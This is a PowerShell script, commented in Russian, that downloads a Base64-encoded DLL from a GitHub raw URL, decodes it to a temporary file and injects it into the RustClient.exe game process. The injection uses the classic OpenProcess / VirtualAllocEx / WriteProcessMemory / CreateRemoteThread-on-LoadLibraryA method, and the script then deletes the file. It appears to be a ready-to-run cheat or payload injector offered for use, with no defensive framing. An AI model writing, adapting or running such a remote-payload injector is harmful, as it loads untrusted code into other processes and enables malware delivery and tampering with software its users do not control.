<#
.SYNOPSIS
    Скачивает Base64-encoded DLL и внедряет её в RustClient.exe через LoadLibraryA.
#>

$Url = "https://raw.githubusercontent.com/PUZAN1337/-/refs/heads/main/svin.dll"
$TargetProcessName = "RustClient"

# --- Проверка прав администратора ---
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Скрипт запущен БЕЗ прав администратора. Инъекция, скорее всего, не сработает." -ForegroundColor Yellow
    Write-Host "    Запустите PowerShell от имени администратора и повторите." -ForegroundColor Yellow
}

# --- Win32 API ---
$Win32Code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint MEM_RELEASE = 0x8000;
    public const uint PAGE_READWRITE = 0x04;
}
"@

if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
    Add-Type -TypeDefinition $Win32Code -ErrorAction Stop
}

# --- Шаг 1. Скачивание ---
Write-Host "[*] Скачивание: $Url" -ForegroundColor Cyan
try {
    $base64String = Invoke-RestMethod -Uri $Url -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Error "Не удалось скачать файл: $($_.Exception.Message)"
    return
}
$base64String = ($base64String -replace '\s', '')
Write-Host "[+] Получено $($base64String.Length) символов Base64" -ForegroundColor Green

# --- Шаг 2. Декодирование ---
Write-Host "[*] Декодирование Base64..." -ForegroundColor Cyan
try {
    $dllBytes = [System.Convert]::FromBase64String($base64String)
} catch {
    Write-Error "Не удалось декодировать Base64: $($_.Exception.Message)"
    return
}
Write-Host "[+] Размер DLL: $($dllBytes.Length) байт" -ForegroundColor Green

# Проверим MZ-заголовок — это точно PE-файл?
if ($dllBytes[0] -ne 0x4D -or $dllBytes[1] -ne 0x5A) {
    Write-Warning "Первые байты не 'MZ' — возможно, файл не является PE/DLL. Первые байты: $($dllBytes[0..3] -join ',')"
}

# --- Шаг 3. Поиск процесса ---
Write-Host "[*] Поиск процесса '$TargetProcessName'..." -ForegroundColor Cyan
$targetProcess = Get-Process -Name $TargetProcessName -ErrorAction SilentlyContinue | Select-Object -First 1

if (-not $targetProcess) {
    Write-Host "[!] Процесс не найден. Все процессы, содержащие 'rust':" -ForegroundColor Yellow
    Get-Process | Where-Object { $_.ProcessName -like '*rust*' } |
        Format-Table Id, ProcessName, Path -AutoSize
    return
}
Write-Host "[+] Найден: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))" -ForegroundColor Green

# --- Шаг 4. Сохраняем DLL во временный файл ---
$tempDll = Join-Path $env:TEMP ("svin_{0}.dll" -f ([Guid]::NewGuid().ToString('N')))
[System.IO.File]::WriteAllBytes($tempDll, $dllBytes)
Write-Host "[+] DLL сохранена во временный файл: $tempDll" -ForegroundColor Green

# --- Шаг 5. Внедрение через LoadLibraryA ---
$hProcess = [IntPtr]::Zero
try {
    Write-Host "[*] OpenProcess(PID=$($targetProcess.Id))..." -ForegroundColor Cyan
    $hProcess = [Win32]::OpenProcess([Win32]::PROCESS_ALL_ACCESS, $false, $targetProcess.Id)
    if ($hProcess -eq [IntPtr]::Zero) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "OpenProcess вернул NULL. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
    }
    Write-Host "[+] Хэндл процесса получен" -ForegroundColor Green

    # Готовим байты пути к DLL (ANSI + null-terminator)
    $pathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempDll + [char]0)

    Write-Host "[*] VirtualAllocEx ($($pathBytes.Length) байт)..." -ForegroundColor Cyan
    $remoteMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$pathBytes.Length, ([Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE), [Win32]::PAGE_READWRITE)
    if ($remoteMem -eq [IntPtr]::Zero) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "VirtualAllocEx вернул NULL. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
    }
    Write-Host "[+] Память выделена по адресу: 0x$($remoteMem.ToString('X'))" -ForegroundColor Green

    Write-Host "[*] WriteProcessMemory..." -ForegroundColor Cyan
    $written = [UIntPtr]::Zero
    $ok = [Win32]::WriteProcessMemory($hProcess, $remoteMem, $pathBytes, [uint32]$pathBytes.Length, [ref]$written)
    if (-not $ok) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "WriteProcessMemory failed. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
    }
    Write-Host "[+] Записано $($written.ToUInt64()) байт" -ForegroundColor Green

    # Адрес LoadLibraryA в kernel32.dll (kernel32 имеет одинаковую базу во всех процессах одной сессии)
    $kernel32 = [Win32]::GetModuleHandle("kernel32.dll")
    $loadLibAddr = [Win32]::GetProcAddress($kernel32, "LoadLibraryA")
    if ($loadLibAddr -eq [IntPtr]::Zero) {
        throw "Не удалось получить адрес LoadLibraryA"
    }
    Write-Host "[+] LoadLibraryA @ 0x$($loadLibAddr.ToString('X'))" -ForegroundColor Green

    Write-Host "[*] CreateRemoteThread..." -ForegroundColor Cyan
    $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $remoteMem, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "CreateRemoteThread вернул NULL. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
    }

    Write-Host "[*] Ожидание завершения удалённого потока..." -ForegroundColor Cyan
    [Win32]::WaitForSingleObject($hThread, [uint32]::MaxValue) | Out-Null
    [Win32]::CloseHandle($hThread) | Out-Null

    Write-Host "[+] DLL успешно загружена в процесс!" -ForegroundColor Green
}
catch {
    Write-Error "Ошибка внедрения: $($_.Exception.Message)"
}
finally {
    if ($hProcess -ne [IntPtr]::Zero) {
        [Win32]::CloseHandle($hProcess) | Out-Null
    }
    # Удаляем временный файл, но не сразу — даём процессу подгрузить DLL
    Start-Sleep -Milliseconds 500
    Remove-Item $tempDll -Force -ErrorAction SilentlyContinue
    Write-Host "[*] Временный файл удалён" -ForegroundColor Cyan
}
